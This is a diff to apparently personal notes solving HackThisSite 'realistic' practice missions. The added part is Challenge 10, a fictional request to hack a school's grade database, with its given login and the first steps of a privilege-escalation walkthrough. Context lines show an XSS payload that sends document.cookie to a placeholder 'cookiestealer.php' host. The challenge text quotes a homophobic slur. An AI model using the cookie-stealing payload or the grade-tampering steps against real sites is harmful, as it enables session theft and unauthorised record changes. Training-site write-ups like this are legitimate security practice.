@@ -44,3 +44,22 @@ Message : javascript:void(window.location="www.yourwebsite.com/cookiestealer.php
 ## Cross-Site Scripting (XSS) attack
 
 window.location="www.yourwebsite.com/cookiestealer.php + document.cookie"
+
+# Challenge 10
+## Question 
+
+From: Zach Sanchez
+
+Message: hey man, it's me Zach, I need a favour from you, I'm in big trouble.
+if you'll remember, I go to that super uptight religious school. well, two of my teachers are failing me because my lifestyle does not fall in line with their moralistic rules for public behaviour. My gym teacher even called me a 'long-haired hippie faggot'! And if I fail any classes, I won't graduate.
+Listen, can you hack into the school's grade database and make it so I'm passing all my classes? I know they have this system set up on their website that allows teachers to submit grades and stuff, and I heard you pulled a few things in the past as well. Their web master was not thinking in terms of computer security when he was designing the website, so it might be easy. Or not. Please check it out <a href="http://hackthissite.org/missions/realistic/10/">here</a>. The username to my account is 'Zach Sanchez' and my password is 'liberty638'. Thanks man!
+
+## Solutions
+index.php [homepage]
+listteachers.php [teacher listing]
+student.php [login studnet accounts]
+staff.php 
+
+1.  Log into the student account by using the given username and password
+2. When we try to look listteacher.php, we realise that "Samantha Miller" has id = 1 --> she is the admin
+3. Try to log into Samantha Miller : using the email address "smiller@holycross.edu"
